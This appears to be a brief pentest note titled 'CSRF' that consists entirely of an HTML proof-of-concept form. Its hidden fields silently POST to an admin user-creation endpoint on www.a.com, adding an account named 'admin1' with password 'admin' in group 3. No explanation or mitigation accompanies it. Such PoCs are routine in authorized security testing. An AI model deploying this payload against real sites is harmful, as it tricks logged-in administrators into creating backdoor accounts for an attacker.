# CSRF
---------------------
```
<html>
  <body>
    <form action="http://www.a.com/admin/user/add" method="POST">
      <input type="hidden" name="groupid" value="3" />
      <input type="hidden" name="username" value="admin1" />
      <input type="hidden" name="password" value="admin" />
      <input type="hidden" name="email" value="123@123.com" />
      <input type="hidden" name="mobile" value="13111111111" />
      <input type="hidden" name="step" value="post" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
